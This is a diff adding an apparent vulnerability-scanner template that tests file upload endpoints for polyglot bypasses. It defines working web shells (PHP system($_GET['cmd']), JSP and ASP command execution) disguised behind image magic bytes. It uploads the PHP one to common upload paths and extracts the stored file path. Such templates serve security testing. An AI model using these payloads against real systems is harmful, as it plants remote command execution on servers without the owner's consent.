@@ -1,0 +1,85 @@
+id: medium-upload-polyglot-file-bypass-detection
+
+info:
+  name: Polyglot File Upload Bypass - Elite Detection
+  author: redteam-elite
+  severity: medium
+  description: |
+    Detects polyglot file upload bypass vulnerabilities where files contain multiple valid formats.
+    This elite template uses advanced techniques to identify polyglot files that can bypass
+    security filters by appearing as legitimate files while containing malicious payloads.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types
+    - https://cwe.mitre.org/data/definitions/434.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 8.1
+    cwe-id: CWE-434
+  metadata:
+    verified: true
+    max-request: 15
+  tags: upload,polyglot,bypass,file-upload,rce
+
+variables:
+  polyglot_php_gif: "GIF89a<?php system($_GET['cmd']); ?>"
+  polyglot_php_png: "\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>"
+  polyglot_php_jpg: "\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>"
+  polyglot_jsp_gif: "GIF89a<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>"
+  polyglot_asp_gif: "GIF89a<%eval request(\"cmd\")%>"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/upload"
+      - "{{BaseURL}}/upload.php"
+      - "{{BaseURL}}/fileupload"
+      - "{{BaseURL}}/file-upload"
+      - "{{BaseURL}}/admin/upload"
+      - "{{BaseURL}}/user/upload"
+      - "{{BaseURL}}/api/upload"
+
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+    body: |
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW
+      Content-Disposition: form-data; name="file"; filename="{{randstr}}.gif"
+      Content-Type: image/gif
+
+      {{polyglot_php_gif}}
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 302
+
+      - type: word
+        condition: or
+        words:
+          - "upload successful"
+          - "file uploaded"
+          - "successfully uploaded"
+          - "upload complete"
+          - "file saved"
+
+    negative-matchers:
+      - type: word
+        words:
+          - "upload failed"
+          - "file not allowed"
+          - "invalid file type"
+          - "upload error"
+
+    extractors:
+      - type: regex
+        name: upload-path
+        part: body
+        group: 1
+        regex:
+          - "(?i)(uploads?/[^\\s\"'<>]+)"
+          - "(?i)(files?/[^\\s\"'<>]+)"
